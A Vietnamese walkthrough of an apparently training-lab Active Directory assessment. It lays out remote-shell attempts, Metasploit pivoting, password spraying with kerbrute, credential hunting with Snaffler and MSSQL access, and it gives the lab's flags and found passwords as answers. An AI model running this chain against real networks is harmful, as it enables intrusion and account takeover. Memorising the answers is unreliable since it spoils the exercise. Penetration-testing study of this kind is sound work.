+Vậy chúng ta sẽ thử xem liệu có thể có shell của MS01 với thông tin vừa tìm được hay không.
+
+```zsh
+impacket-psexec inlanefreight.local/AB920:weasal@172.16.7.50
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.7.50.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+```
+
+```zsh
+evil-winrm -i 172.16.7.50 -u AB920 -p weasal
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\AB920\Documents> whoami
+inlanefreight\ab920
+*Evil-WinRM* PS C:\Users\AB920\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+```
+
+```powershell
+*Evil-WinRM* PS C:\> type flag.txt
+aud1t_gr0up_m3mbersh1ps!
+```
+
+Mặc dù có shell foothold nhưng có vẻ như chúng ta không có quyền...
+
+![](../48.png)
+
+Chúng ta có thể rdp sang MS01, trước hết ta phải thiết lập sockproxy và auto route:
+
+Lấy revshell từ máy linux về
+
+![](../47.png)
+
+Set socks4
+```zsh
+use auxiliary/server/socks_proxy
+set srvhost 0.0.0.0
+set srvport 9050
+set version 4a
+run
+```
+
+Set auto route
+```zsh
+use post/multi/manage/autoroute
+set session 1
+set subnet 172.16.7.0
+set netmask /23
+run
+```
+
+RDP to MS01
+
+```zsh
+proxychains xfreerdp3 /v:172.16.7.50 /d:INLANEFREIGHT.LOCAL /u:AB920 /p:weasal /drive:linux,/home/kali/Desktop/learning/AD_enum_attack/share 
+```
+
+Sau đó chúng ta nên chạy SharpHound.exe cho các bước quan trọng sau này.
+
++ 1  Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
+
+Thử liệt kê SMB nhưng có vẻ không có gì.
+
+```zsh
+smbmap -u AB920 -p weasal -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' --dir-only
+[+] IP: 172.16.7.3:445  Name: inlanefreight.local                               
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Department Shares                                       READ ONLY
+        .\Department Shares\*
+        dr--r--r--                0 Fri Apr  1 11:04:17 2022    .
+        dr--r--r--                0 Fri Apr  1 11:04:17 2022    ..
+        dr--r--r--                0 Fri Apr  1 11:04:51 2022    Accounting
+        dr--r--r--                0 Fri Apr  1 11:04:46 2022    Executives
+        dr--r--r--                0 Fri Apr  1 11:04:41 2022    Finance
+        dr--r--r--                0 Fri Apr  1 11:04:25 2022    HR
+        dr--r--r--                0 Fri Apr  1 11:04:19 2022    IT
+        dr--r--r--                0 Fri Apr  1 11:04:35 2022    Marketing
+        dr--r--r--                0 Fri Apr  1 11:04:30 2022    R&D
+
+```
+
+Wow, tôi đã thử qua rất nhiều cách, đi đến đây thực sự cảm thấy thú vị và lo lắng rằng lối đi của mình không đúng. Tôi phải nhờ đến gợi ý rằng chúng ta sẽ phải `spray password`, điều mà không ai thực sự muốn, kể cả tôi.
+
+Giờ đây chúng ta cần xem qua chính sách mật khẩu:
+
+```zsh
+sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --pass-pol
+SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\AB920:weasal 
+SMB         172.16.7.3      445    DC01             [+] Dumping password info for domain: INLANEFREIGHT
+SMB         172.16.7.3      445    DC01             Minimum password length: 1
+SMB         172.16.7.3      445    DC01             Password history length: None
+SMB         172.16.7.3      445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
+SMB         172.16.7.3      445    DC01             
+SMB         172.16.7.3      445    DC01             Password Complexity Flags: 000000
+SMB         172.16.7.3      445    DC01                 Domain Refuse Password Change: 0
+SMB         172.16.7.3      445    DC01                 Domain Password Store Cleartext: 0
+SMB         172.16.7.3      445    DC01                 Domain Password Lockout Admins: 0
+SMB         172.16.7.3      445    DC01                 Domain Password No Clear Change: 0
+SMB         172.16.7.3      445    DC01                 Domain Password No Anon Change: 0
+SMB         172.16.7.3      445    DC01                 Domain Password Complex: 0
+SMB         172.16.7.3      445    DC01             
+SMB         172.16.7.3      445    DC01             Minimum password age: None
+SMB         172.16.7.3      445    DC01             Reset Account Lockout Counter: 30 minutes 
+SMB         172.16.7.3      445    DC01             Locked Account Duration: 30 minutes 
+SMB         172.16.7.3      445    DC01             Account Lockout Threshold: None
+SMB         172.16.7.3      445    DC01             Forced Log off Time: Not Set
+```
+
+Vấn đề là cái password policy này chỉ cho ta biết rằng chúng ta có thể thử thoải mái, ngoài ra không có gì đặc biệt. Do đó tôi đã hỏi một vài người và họ nhấn mạnh rằng `Welcome1` được nhắc đến rất nhiều trong các bài học về attack password. Và nó cũng là đáp án của câu hỏi sau. Vấn đề giờ là ta cần tìm chủ của cái mật khẩu này.
+
+Trước hết lấy danh sách người dùng miền, lọc chúng ra một file.
+
+```zsh
+sudo crackmapexec smb dc01 -u AB920 -p weasal --users >> raw_data_users.txt
+```
+
+Xử lý chuỗi:
+
+```zsh
+cat raw_data_users.txt | grep 'badpwdcount' | awk '{print $5;}' | cut -d'\' -f2 > valid_users.txt
+```
+
+Tiến hành password spraying
+
+```zsh
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 06/18/25 - Ronnie Flathers @ropnop
+
+2025/06/18 11:02:00 >  Using KDC(s):
+2025/06/18 11:02:00 >   172.16.7.3:88
+
+2025/06/18 11:02:14 >  [+] VALID LOGIN:  BR086@inlanefreight.local:Welcome1
+2025/06/18 11:02:14 >  Done! Tested 2901 logins (1 successes) in 14.773 seconds
+```
+
++ 1  What is this user's password?
+
+Welcome1
+
++ 1  Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
+
+RDP sang MS01 với tư cách là `BR086`
+
+```zsh
+proxychains xfreerdp3 /v:172.16.7.50 /d:INLANEFREIGHT.LOCAL /u:BR086 /p:Welcome1 /drive:linux,/home/kali/Desktop/learning/AD_enum_attack/share 
+```
+
+Chạy Snaffler.exe chúng ta thu được một mật khẩu:
+
+```powershell
+[INLANEFREIGHT\BR086@MS01] 2025-06-18 15:55:55Z [File] {Yellow}<KeepDbConnStringPw|R|connectionstring.{1,200}passw|1.2kB|2022-04-01 15:04:05Z>(\\DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Private\Development\web.config) etEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS;database=master;Integrated\ Security=SSPI;Pooling=true"/>\ \n\ \ \ \ \ \ \ </masterDataServices>\ \ \n\ \ \ \ \ \ \ <connectionStrings>\n\ \ \ \ \ \ \ \ \ \ \ <add\ name="ConString"\ connectionString="Environment\.GetEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS';Initial\ Catalog=Northwind;User\ ID=netdb;Password=D@ta_bAse_adm1n!"/>\n\ \ \ \ \ \ \ </connectionStrings>\n\ \ </system\.web>\n</co
+```
+
+Như vậy chúng ta có một thông tin đăng nhập : ID=netdb;Password=D@ta_bAse_adm1n!
+
+Tôi thử qua password spraying một lần nữa, nhưng có vẻ nó hướng ta tới thực thi lệnh trong mssql thay vì cho chúng ta một foothold trên SQL01.
+
+```zsh
+sudo crackmapexec smb 172.16.7.3 -u mssqlsvc -p 'D@ta_bAse_adm1n!'
+SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.7.3      445    DC01             [-] INLANEFREIGHT.LOCAL\mssqlsvc:D@ta_bAse_adm1n! STATUS_LOGON_FAILURE 
+```
+
+Tôi cũng đã thử password spraying nhưng không thành công
+
+```zsh
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt 'D@ta_bAse_adm1n!'
+```
+
+Cuối cùng tôi quyết định thử với mssqlclient.py
+
+```zsh
+proxychains impacket-mssqlclient netdb@172.16.7.60
+```
+
+Sau đó chúng ta thử thực thi vài câu lệnh
+
+![](../49.png)
+
+Ở đây chúng ta thấy có quyền mạo danh tài khoản khác, như vậy khả năng cao đang có một tài khoản có `Session` ở  máy chủ này (SQL01, bạn có thể check bằng `hostname`). Chúng ta sẽ truy vấn nó trong BloodHound
+
+![](../50.png)
+
+Không ngoài dự đoán khi ở đây chúng ta có thể mạo danh mssqlsvc@inlanefreight.local
+
+Để làm được điều này, ta cần một revershell, tốt nhất là cho `msfconsole` hoặc một `potato attack`.
+
++ 1  Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+
++10 Streak pts
+
+ Submit
+
++ 1  Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+
++10 Streak pts
+
+ Submit
+
+ Hint
+
++ 1  Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
+
++10 Streak pts
+
+ Submit
+
+ Hint
+
++ 1  Crack this user's password hash and submit the cleartext password as your answer.
+
++10 Streak pts
+
+ Submit
+
++ 1  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
+
++10 Streak pts
+
+ Submit
+
++ 1  Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
